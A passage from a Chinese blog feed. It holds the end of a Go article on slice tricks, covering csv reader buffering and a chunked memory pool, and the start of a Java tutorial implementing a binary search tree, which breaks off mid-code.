    // This pins the memory of the fields together, but allocates once.
    str := string(r.recordBuffer) // Convert to string once to batch allocations
    dst = dst[:0]
    if cap(dst) &amp;lt; len(r.fieldIndexes) {
        dst = make([]string, len(r.fieldIndexes))
    }
    dst = dst[:len(r.fieldIndexes)]
    var preIdx int
    for i, idx := range r.fieldIndexes {
        dst[i] = str[preIdx:idx]
        preIdx = idx
    }
    return dst, err
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里删除了极多的代码，但是能看懂大意，其中 &lt;code&gt;line&lt;/code&gt; 是一段 &lt;code&gt;bufio&lt;/code&gt; 中的一段引用，所以这块数据不能返回给用户，也不能进行并发读取操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;r.recordBuffer&lt;/code&gt; 和 &lt;code&gt;r.fieldIndexes&lt;/code&gt; 是 &lt;code&gt;csv&lt;/code&gt; 的缓存，他们初始的时候容量是0，是不是会有些奇怪，之前还建议 &lt;code&gt;slice&lt;/code&gt; 初始一个长度，来减少内存分配，&lt;code&gt;csv&lt;/code&gt; 这个库的设计非常的巧妙，假设 &lt;code&gt;csv&lt;/code&gt; 每行字段的个数一样，数据长度也相近，现实业务确实如此，所以只有读取第一行数据的时候才会发生大量的 &lt;code&gt;slice&lt;/code&gt; 扩容， 之后其它行扩容的可能性非常的小，整个文件读取完也不会发生太多次，不得不说设计的太妙了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;r.recordBuffer&lt;/code&gt; 用来存储行中除了分隔符的所有数据，&lt;code&gt;r.fieldIndexes&lt;/code&gt; 用来存储每个字段数据在 &lt;code&gt;r.recordBuffer&lt;/code&gt; 中的索引。每次都通过 &lt;code&gt;r.recordBuffer[:0]&lt;/code&gt; 这个的数据获取，读取每行数据都反复使用这块内存，极大的减少内存开销。&lt;/p&gt;
&lt;p&gt;更巧妙的设计是 &lt;code&gt;str := string(r.recordBuffer)&lt;/code&gt; 源代码中也有详细的说明，一次性分配足够的内存， 要知道类型转换是会发生内存拷贝的，分配新的内存， 如果每个字段转换一次，会发生很多的内存拷贝和分配，之后通过 &lt;code&gt;dst[i] = str[preIdx:idx]&lt;/code&gt; 引用 &lt;code&gt;str&lt;/code&gt; 中的数据达到切分字段的效果，因为引用字符串并不会拷贝字符串（字符串不可变，引用字符串的子串是安全的）所以其代价非常的小。&lt;/p&gt;
&lt;p&gt;这段源码中还有一个很多人都不知道的 &lt;code&gt;slice&lt;/code&gt; 特性的例子，&lt;code&gt;dst = dst[:0]; dst = dst[:len(r.fieldIndexes)]&lt;/code&gt; 这两句话放到一起是不是感觉很不可思议，明明 &lt;code&gt;dst&lt;/code&gt; 的长度被清空了，&lt;code&gt;dst[:len(r.fieldIndexes)]&lt;/code&gt; 不是会发生索引越界吗，很多人认为 &lt;code&gt;s[i:l]&lt;/code&gt; 这种写法是当前 &lt;code&gt;slice&lt;/code&gt; 的索引，实际并非如此，这里面的 &lt;code&gt;i&lt;/code&gt; 和 &lt;code&gt;j&lt;/code&gt; 是底层引用数组相对当前 &lt;code&gt;slice&lt;/code&gt; 引用位置的索引，并不受当前 &lt;code&gt;slice&lt;/code&gt; 的长度的影响。&lt;/p&gt;
&lt;p&gt;这里只是简单引用 &lt;code&gt;csv&lt;/code&gt; 源码中的一段分析其 &lt;code&gt;slice&lt;/code&gt; 的巧妙用法，即把 &lt;code&gt;slice&lt;/code&gt; 当做数据缓存，也作为分配内存的一种极佳的方法，这个示例中的关于 &lt;code&gt;slice&lt;/code&gt; 的使用值得反复推敲。&lt;/p&gt;
&lt;h2 id=&quot;内存池&quot;&gt;内存池&lt;/h2&gt;
&lt;p&gt;早些时间阅读 GitHub 上的一些源码，发现一个实现内存次的例子，里面对 &lt;code&gt;slice&lt;/code&gt; 的应用非常有特点，在这里拿来分析一下（&lt;a href=&quot;https://github.com/funny/slab/blob/master/chan_pool.go&quot;&gt;GitHub源码&lt;/a&gt;）：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func NewChanPool(minSize, maxSize, factor, pageSize int) *ChanPool {
    pool := &amp;amp;ChanPool{make([]chanClass, 0, 10), minSize, maxSize}
    for chunkSize := minSize; chunkSize &amp;lt;= maxSize &amp;amp;&amp;amp; chunkSize &amp;lt;= pageSize; chunkSize *= factor {
        c := chanClass{
            size:   chunkSize,
            page:   make([]byte, pageSize),
            chunks: make(chan []byte, pageSize/chunkSize),
        }
        c.pageBegin = uintptr(unsafe.Pointer(&amp;amp;c.page[0]))
        for i := 0; i &amp;lt; pageSize/chunkSize; i++ {
            // lock down the capacity to protect append operation
            mem := c.page[i*chunkSize : (i+1)*chunkSize : (i+1)*chunkSize]
            c.chunks &amp;lt;- mem
            if i == len(c.chunks)-1 {
                c.pageEnd = uintptr(unsafe.Pointer(&amp;amp;mem[0]))
            }
        }
        pool.classes = append(pool.classes, c)
    }
    return pool
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里采用步进式分页，保证每页上的数据块大小相同，一次性创建整个页 &lt;code&gt;make([]byte, pageSize)&lt;/code&gt; ，之后从页切分数据块 &lt;code&gt;mem := c.page[i*chunkSize : (i+1)*chunkSize : (i+1)*chunkSize]&lt;/code&gt;， 容量和数据块长度一致，创建一块较大的内存，减少系统调用，当然这个例子中还可以创建更大的内存，就是每页容量的总大小，避免创建更多页，所有的块数据都引用一块内存。&lt;/p&gt;
&lt;p&gt;这里限制了每个块的容量，默认引用 &lt;code&gt;slice&lt;/code&gt; 的容量是引用起始位置到底层数组的结尾，但是可以指定容量，这就保证了获取的数据块不会因为用户不遵守约定超出其大小导致数据写入到其它块中的问题，设定了容量用户使用超出容量后就会拷贝出去并创建新的 &lt;code&gt;slice&lt;/code&gt; 实在的很妙的用法。&lt;/p&gt;
&lt;p&gt;一次分配更大的内存可以减少内存碎片，更好的复用内存。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (pool *ChanPool) Alloc(size int) []byte {
    if size &amp;lt;= pool.maxSize {
        for i := 0; i &amp;lt; len(pool.classes); i++ {
            if pool.classes[i].size &amp;gt;= size {
                mem := pool.classes[i].Pop()
                if mem != nil {
                    return mem[:size]
                }
                break
            }
        }
    }
    return make([]byte, size)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;获取内存池中的内存就非常简单，查找比需要大小更大的块并返回即可，这不失为一个较好的内存复用算法。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;func (pool *ChanPool) Free(mem []byte) {
    size := cap(mem)
    for i := 0; i &amp;lt; len(pool.classes); i++ {
        if pool.classes[i].size == size {
            pool.classes[i].Push(mem)
            break
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当使用完释放内存时实现的并不是很好，应该判断释放的数据是否是当前内存的一部分，如果不是的就不能放回到内存池中，因为用户未按约定大小使用，导致大量扩容而使得内存池中的数据碎片化，当然用户一旦发生扩容就会导致内存池中的缓存块丢失，导致存在大块内存无法释放，却也没法使用的情况。&lt;/p&gt;
&lt;p&gt;之所以分析这个例子主要是分析其使用 &lt;code&gt;slice&lt;/code&gt; 的方法和技巧，并不推荐使用该方法管理内存。&lt;/p&gt;
&lt;h2 id=&quot;拓展&quot;&gt;拓展&lt;/h2&gt;
&lt;p&gt;更多关于 &lt;code&gt;slice&lt;/code&gt; 应用的例子可以参考标准库 &lt;code&gt;bytes&lt;/code&gt; 与 &lt;code&gt;bufio&lt;/code&gt;， &lt;code&gt;buffer&lt;/code&gt; 与 &lt;code&gt;bufio&lt;/code&gt; 的使用极其相似，两个包都是使用 &lt;code&gt;slice&lt;/code&gt; 来减少内存分配及系统调用来达到实现缓冲和缓存的例子。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;转载：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文作者： 戚银（&lt;a href=&quot;https://blog.thinkeridea.com/&quot;&gt;thinkeridea&lt;/a&gt;）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文链接： &lt;a href=&quot;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&quot; class=&quot;uri&quot;&gt;https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;版权声明： 本博客所有文章除特别声明外，均采用 &lt;a href=&quot;http://creativecommons.org/licenses/by/4.0/deed.zh&quot;&gt;CC BY 4.0 CN协议&lt;/a&gt; 许可协议。转载请注明出处！&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 14:47:00 +0000</pubDate>
<dc:creator>戚银</dc:creator>
<og:description>原文链接： 'https://blog.thinkeridea.com/201901/go/slice_de_yi_xie_shi_yong_ji_qiao.html' 是 语言十分重要的数据类型，它</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/thinkeridea/p/10317417.html</dc:identifier>
</item>
<item>
<title>自己动手实现java数据结构（六）二叉搜索树 - 小熊餐馆</title>
<link>http://www.cnblogs.com/xiaoxiongcanguan/p/10277762.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaoxiongcanguan/p/10277762.html</guid>
<description>&lt;p&gt;　　前面我们已经介绍过了向量和链表。有序向量可以以二分查找的方式高效的查找特定元素，而缺点是插入删除的效率较低(需要整体移动内部元素)；链表的优点在于插入，删除元素时效率较高，但由于不支持随机访问，特定元素的查找效率为线性复杂度O(1)，效率较低。&lt;/p&gt;
&lt;p&gt;　　向量和链表的优缺点是互补的，那么有没有办法兼具两者的优点呢？这便引出了接下来需要介绍的数据结构——&lt;strong&gt;二叉搜索树&lt;/strong&gt;(&lt;strong&gt;B&lt;/strong&gt;inary &lt;strong&gt;S&lt;/strong&gt;earch &lt;strong&gt;T&lt;/strong&gt;ree)。&lt;/p&gt;
&lt;p&gt;　　二叉搜索树和链表类似，同样是以节点为单位存储数据的链式数据结构。二叉搜索树作为一种树形数据结构，内部维护着一个根节点，在插入新数据时，会不断的和当前子树的根节点进行key值的大小比较，较小的key值落在左子树，较大的key值落在右子树，使得二叉搜索树从左到右维持一个有序的状态。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;形式化的定义&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;二叉搜索树的左子树上结点的值均小于根结点的值；右子树上结点的值均大于根结点的值；二叉搜索树的左、右子树也分别为二叉搜索树。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　由于二叉搜索树中的数据是有序存储的，可以使用高效的二分查找查询特定元素；同时由于内部存储结构为链式节点，在插入、删除元素时的效率和链表类似，也十分高效。&lt;/p&gt;
&lt;p&gt;　　可以说，&lt;strong&gt;二叉搜索树兼具了向量和链表的优点&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1506329/201901/1506329-20190117194204116-1288464092.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　二叉搜索树同样是一个存储key/value类型数据结构，因此和哈希表实现共用同一个接口（Map）。K/V数据结构需要暴露出内部节点的Key，value给用户灵活的访问，但哈希表和二叉搜索树的内部节点实现有一定的差异，所以在Map接口中暴露了Map.EntryNode接口，由哈希表和二叉搜索树的内部节点分别实现Map.EntryNode接口。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; Map &amp;lt;K,V&amp;gt;&lt;span&gt;{
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 存入键值对
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; value value
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 被覆盖的的value值
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    V put(K key,V value);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 移除键值对
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 被删除的value的值
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    V remove(K key);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获取key对应的value值
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      对应的value值
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    V get(K key);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 是否包含当前key值
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      true：包含 false：不包含
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsKey(K key);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 是否包含当前value值
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; value   value值
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;        true：包含 false：不包含
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsValue(V value);

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得当前map存储的键值对数量
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 键值对数量
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size();

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 当前map是否为空
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;  true：为空 false：不为空
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isEmpty();

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 清空当前map
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear();

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得迭代器
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 迭代器对象
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    Iterator&lt;/span&gt;&amp;lt;EntryNode&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; iterator();

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * entry 键值对节点接口
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;interface&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 获得key值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        K getKey();

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 获得value值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        V getValue();

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 设置value值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setValue(V value);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;3.1 二叉搜索树基本属性&lt;/h3&gt;
&lt;p&gt;　　值得一提的是，二叉搜索树通过给存储的元素进行排序来加快查询的速度(遍历查询 ---&amp;gt; 二分查询)。&lt;/p&gt;
&lt;p&gt;　　java是面向对象的语言，二叉搜索树中的元素不仅仅是整数、小数。如果说对于整数、小数甚至字符串的排序，我们确定了一个公认的排序逻辑。但是用户自定义的对象，例如小猫、小狗对象的排序可就仁者见仁智者见智了。&lt;/p&gt;
&lt;p&gt;　　由于java并不支持比较符号&quot;&amp;gt;&quot;，&quot;&amp;lt;&quot;的运算符重载，因此我们提供了一个比较排序的接口，用户可以在二叉搜索树初始化时指定排序时元素间比较的逻辑，使得二叉搜索树能以满足用户需求的方式执行排序的逻辑。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;比较器接口(Comparator)定义：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@FunctionalInterface
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; Comparator&amp;lt;T&amp;gt;&lt;span&gt; {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 比较方法逻辑
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; o1    参数1
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; o2    参数2
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      返回值大于0 ---&amp;gt; (o1 &amp;gt; o2)
     *              返回值等于0 ---&amp;gt; (o1 = o2)
     *              返回值小于0 ---&amp;gt; (o1 &amp;lt; o2)
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(T o1, T o2);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;基本属性:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; TreeMap&amp;lt;K,V&amp;gt; &lt;span&gt;implements&lt;/span&gt; Map&amp;lt;K,V&amp;gt;&lt;span&gt;{

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; root;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 比较器(初始化之后，不能改)
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Comparator&amp;lt;? &lt;span&gt;super&lt;/span&gt; K&amp;gt;&lt;span&gt; comparator;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 当前二叉树的大小
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 默认构造函数
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; TreeMap() {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.comparator = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 指定了比较器的构造函数
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; TreeMap(Comparator&amp;lt;? &lt;span&gt;super&lt;/span&gt; K&amp;gt;&lt;span&gt; comparator) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.comparator =&lt;span&gt; comparator;
    }
｝&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.2 二叉搜索树内部节点&lt;/h3&gt;
&lt;p&gt;　　二叉搜索树的内部节点除了必须的key，value字段，同时还维护了左、右孩子节点和双亲节点的引用。&lt;/p&gt;
&lt;p&gt;　　通过实现暴露出去的Map.EntryNode接口，允许用户访问内部节点的key、value值，但二叉搜索树节点内部的孩子、双亲节点的引用是被封装起来的，外部用户是无法感知，也无需了解的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
   &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 二叉搜索树 内部节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt; &lt;span&gt;implements&lt;/span&gt; Map.EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * key值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        K key;
        
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * value值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        V value;
        
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 左孩子节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; left;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 右孩子节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; right;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 双亲节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; parent;

        EntryNode(K key, V value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.key =&lt;span&gt; key;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
        }

        EntryNode(K key, V value,EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; parent) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.key =&lt;span&gt; key;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.parent =&lt;span&gt; parent;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; K getKey() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; key;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V getValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; value;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setValue(V value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String toString() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; key + &quot;=&quot; +&lt;span&gt; value;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.3 二叉搜索树 内部辅助函数&lt;/h3&gt;
&lt;p&gt;　　为了简化代码逻辑以及去除重复代码，在实现过程中提取出了诸如：获取第一个节点(&lt;strong&gt;getFirst&lt;/strong&gt;)、获取节点直接后继(&lt;strong&gt;getSuccessor&lt;/strong&gt;)、获得key值对应目标节点(&lt;strong&gt;getTargetEntryNode&lt;/strong&gt;)等等辅助方法。&lt;/p&gt;
&lt;p&gt;　　getTargetEntryNode用于获取key值对应的目标节点，运用了哨兵的思想。从根节点开始，使用二分查找的方式逐步逼近key值对应目标节点的位置。&lt;/p&gt;
&lt;p&gt;　　如果目标节点确实存在，自然直接返回目标节点的引用(相对位置：&lt;strong&gt;RelativePosition.CURRENT&lt;/strong&gt;)；&lt;/p&gt;
&lt;p&gt;　　当目标节点不存在时，则&lt;strong&gt;假设目标节点已经存在&lt;/strong&gt;(哨兵节点)，返回哨兵节点的双亲节点引用以及哨兵节点的相对位置(左、右节点：&lt;strong&gt;RelativePosition.LEFT&lt;/strong&gt;、&lt;strong&gt;RelativePosition.Right&lt;/strong&gt;)。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1506329/201901/1506329-20190120100916666-346043909.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;66&quot;&gt;
&lt;pre&gt;
   &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * target 和目标节点的相对位置
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; RelativePosition {
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 左节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        LEFT,

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 右节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        RIGHT,

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 当前节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        CURRENT;
    }

 　　&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 查找目标节点 返回值
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; TargetEntryNode&amp;lt;K,V&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 目标节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; target;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 目标节点的双亲节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; parent;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 相对位置
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt;&lt;span&gt; RelativePosition relativePosition;

        TargetEntryNode(EntryNode&lt;/span&gt;&amp;lt;K, V&amp;gt; target, EntryNode&amp;lt;K, V&amp;gt;&lt;span&gt; parent, RelativePosition relativePosition) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.target =&lt;span&gt; target;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.parent =&lt;span&gt; parent;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.relativePosition =&lt;span&gt; relativePosition;
        }
    }

 　　&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得key对应的目标节点
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   对应的key
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      对应的目标节点
     *               返回null代表 目标节点不存在
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; TargetEntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; getTargetEntryNode(K key){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; compareResult = 0&lt;span&gt;;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; parent = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; currentNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.root;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(currentNode != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            parent &lt;/span&gt;=&lt;span&gt; currentNode;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前key 和 currentNode.key进行比较&lt;/span&gt;
            compareResult =&lt;span&gt; compare(key,currentNode.key);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(compareResult &amp;gt; 0&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前key 大于currentNode 指向右边节点&lt;/span&gt;
